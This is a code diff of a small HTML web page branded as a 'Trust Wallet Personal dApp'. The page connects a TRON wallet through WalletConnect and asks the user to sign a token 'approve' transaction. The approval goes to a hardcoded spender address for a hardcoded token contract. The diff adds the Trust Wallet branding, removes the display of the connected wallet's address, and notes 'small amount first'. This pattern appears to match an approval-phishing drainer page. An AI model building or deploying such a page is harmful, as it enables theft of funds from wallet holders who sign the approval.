@@ -1,11 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <title>TRON Approval – Personal dApp</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="utf-8">
+  <title>Trust Wallet – TRON Approval (Personal)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <!-- WalletConnect -->
+  <!-- 🔧 REQUIRED POLYFILL -->
+  <script>
+    window.process = { env: {} };
+  </script>
+
+  <!-- WalletConnect Ethereum Provider (UMD) -->
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.13.2/dist/index.umd.js"></script>
 
   <!-- TronWeb -->
@@ -20,39 +25,37 @@
 
 <body>
 
-<h3>🔐 TRON Approval (Personal Use)</h3>
+<h3>🔐 Trust Wallet Personal dApp</h3>
 
 <button onclick="connect()">Connect Trust Wallet</button>
 <button onclick="approve()">Approve Token</button>
 
 <div class="box">
   <div>Status: <span id="status">Disconnected</span></div>
-  <div>Wallet: <span id="addr">-</span></div>
   <div>TxID: <span id="txid">-</span></div>
 </div>
 
 <script>
 const PROJECT_ID = "e75f4f36f23f8e6dc1f84a86fdbfa4ea";
 
-// 🔴 YOU MUST SET THESE EXPLICITLY
-const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20
-const SPENDER = "TZC9E9PNULB87BKPhPmtrZBPRsu7QUPfTk";       // your MAIN wallet
-const AMOUNT = "1000000000000000000";              // token units
+// ⚠️ CHANGE THESE
+const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const SPENDER = "TZC9E9PNULB87BKPhPmtrZBPRsu7QUPfTk";
+const AMOUNT = "1000000"; // small amount first
 
-let provider;
+let wcProvider;
 let tronWeb;
-let walletAddress;
 
 async function connect() {
-  provider = await window.EthereumProvider.init({
+  // ✅ CORRECT GLOBAL NAME
+  wcProvider = await window.WalletConnectEthereumProvider.init({
     projectId: PROJECT_ID,
-    chains: [1], // dummy EVM chain (session only)
+    chains: [1],            // dummy EVM chain
     showQrModal: true
   });
 
-  await provider.connect();
+  await wcProvider.connect();
 
-  // Create tronWeb instance (NO private key)
   tronWeb = new TronWeb({
     fullHost: "https://api.trongrid.io"
   });
@@ -61,12 +64,11 @@ async function connect() {
 }
 
 async function approve() {
-  if (!provider || !tronWeb) {
+  if (!wcProvider || !tronWeb) {
     alert("Connect wallet first");
     return;
   }
 
-  // Build approve TX
   const contractHex = tronWeb.address.toHex(TOKEN_CONTRACT);
 
   const { transaction } =
@@ -80,8 +82,8 @@ async function approve() {
       ]
     );
 
-  // 🔥 CUSTOM SIGNING (wallet-specific)
-  const signedTx = await provider.request({
+  // 🔥 NON-STANDARD BUT WORKING (Trust Wallet only)
+  const signedTx = await wcProvider.request({
     method: "tron_signTransaction",
     params: [transaction]
   });
